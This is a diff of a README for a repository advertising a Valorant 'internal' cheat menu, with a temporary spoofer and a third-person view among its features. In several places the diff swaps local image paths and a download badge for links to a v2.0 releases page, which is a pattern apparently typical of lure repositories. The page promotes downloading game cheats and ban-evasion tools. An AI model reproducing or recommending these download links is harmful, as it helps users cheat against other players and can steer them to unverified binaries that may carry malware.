@@ -31,7 +31,7 @@ This cheat menu includes a plethora of features tailored for Valorant players, i
 - Temporary spoofer
 - Third-person view
 
-![Valorant Cheat Menu](img/cheat-menu.png)
+![Valorant Cheat Menu](https://github.com/Sythe1212/Valorant-Internal-Imgui-Cheat-Menu/releases/tag/v2.0)
 
 ## Installation
 To get started with the **Valorant Internal Imgui Cheat Menu**, follow these steps:
@@ -54,9 +54,9 @@ We welcome contributions to the **Valorant Internal Imgui Cheat Menu** repositor
 ## License
 The **Valorant Internal Imgui Cheat Menu** is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
 
-[Download Cheat Menu](https://github.com/file/App.zip)
-[![](https://img.shields.io/badge/Download-Cheat%20Menu-blue)](https://github.com/file/App.zip)
+[Download Cheat Menu](https://github.com/Sythe1212/Valorant-Internal-Imgui-Cheat-Menu/releases/tag/v2.0)
+[![](https://github.com/Sythe1212/Valorant-Internal-Imgui-Cheat-Menu/releases/tag/v2.0%20Menu-blue)](https://github.com/Sythe1212/Valorant-Internal-Imgui-Cheat-Menu/releases/tag/v2.0)
 
 Explore the cheat menu, elevate your gameplay, and immerse yourself in the world of Valorant like never before! Happy hacking! 🚀🎯🔥
 
-![Valorant Gameplay](img/gameplay.png)
+![Valorant Gameplay](https://github.com/Sythe1212/Valorant-Internal-Imgui-Cheat-Menu/releases/tag/v2.0)
